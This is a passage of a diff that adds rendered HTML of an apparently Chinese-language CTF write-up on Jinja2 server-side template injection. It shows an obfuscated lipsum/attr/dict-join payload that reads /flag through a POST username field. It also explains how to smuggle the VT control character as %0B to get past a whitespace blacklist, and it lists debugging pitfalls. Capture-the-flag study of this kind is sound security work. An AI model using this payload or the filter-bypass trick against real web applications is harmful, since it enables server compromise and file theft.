+</span><span id="__span-113-7"><a id="__codelineno-113-7" name="__codelineno-113-7" href="#__codelineno-113-7"></a><span class="cp">{{</span><span class="nv">lipsum</span><span class="o">|</span><span class="nf">attr</span><span class="o">(</span><span class="nv">GS</span><span class="o">)|</span><span class="nf">attr</span><span class="o">(</span><span class="nv">GT</span><span class="o">)(</span><span class="nv">BB</span><span class="o">)|</span><span class="nf">attr</span><span class="o">(</span><span class="nv">GT</span><span class="o">)(</span><span class="nv">dict</span><span class="o">(</span><span class="nv">open</span><span class="o">=</span><span class="m">1</span><span class="o">)|</span><span class="nf">join</span><span class="o">)(</span><span class="nv">SL</span><span class="o">~</span><span class="nv">dict</span><span class="o">(</span><span class="nv">flag</span><span class="o">=</span><span class="m">1</span><span class="o">)|</span><span class="nf">join</span><span class="o">)|</span><span class="nf">attr</span><span class="o">(</span><span class="nv">RD</span><span class="o">)()</span><span class="cp">}}</span>
+</span></code></pre></div>
+<p><strong>连成一行 390 字符，POST <code>username</code> 参数，读 <code>/flag</code>。</strong></p>
+</details>
+<details class="note">
+<summary>怎么把 VT 发出去</summary>
+<p><strong>VT 是控制字符，键盘上打不出来，编辑器里也看不见。</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-114-1"><a id="__codelineno-114-1" name="__codelineno-114-1" href="#__codelineno-114-1"></a>✗ 直接打 \x0b 四个字符   → TemplateSyntaxError: unexpected char '\'
+</span><span id="__span-114-2"><a id="__codelineno-114-2" name="__codelineno-114-2" href="#__codelineno-114-2"></a>✗ 直接打 0x0B           → 那是数字 11，set 后面没有空白，报 500
+</span><span id="__span-114-3"><a id="__codelineno-114-3" name="__codelineno-114-3" href="#__codelineno-114-3"></a>✓ POST body 写 %0B      → urlencoded，服务端解码成真字节
+</span></code></pre></div>
+<p><strong>调试时用编码、别用看不见的字符——否则排错时根本分不清是"没粘上"还是"粘错了"。</strong></p>
+</details>
+<hr />
+<details class="note">
+<summary>这题踩的坑</summary>
+<p><strong>① 把 <code>0x0B</code> 当成字符</strong></p>
+<p><code>{{0x0B}}</code> 渲染出来是 <strong>11</strong>——它是数字。三次尝试（<code>0x0B</code>、<code>\x0b</code>、<code>\s</code>）都错在同一个认知上。</p>
+<p><strong>② 以为 Tab 能用</strong></p>
+<p>空格被封时第一反应是用 Tab，<strong>但这题 Tab 也在黑名单里</strong>。可用的只有 VT/FF/LF。</p>
+<p><strong>③ 拼词拼错</strong></p>
+<p><code>dict(gl=1)|join~dict(oblas=1)|join</code> → <code>globlas</code>。差一个字母，整条链断，而且报错是 <code>Exception</code>（程序吞了），看不出哪错了。</p>
+<p><strong>④ <code>|batch</code> 返回生成器</strong></p>
+<p>直接渲染是 <code>&lt;generator object&gt;</code>，必须 <code>|first</code> 或 <code>|list</code>。</p>
+<p><strong>⑤ 直接假设 <code>/flag</code></strong></p>
+<p>WP 里写 <code>/flag</code> 能成，是因为这环境里确实有。但换个环境，<strong>先 <code>listdir('/')</code> 才是稳的。</strong></p>
+</details>
+    
+    
+  </div>
+</article>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
           <time datetime="2026-11-01 21:40:00+00:00">2026-11-01</time></li>
         
           <li class="md-meta__item">
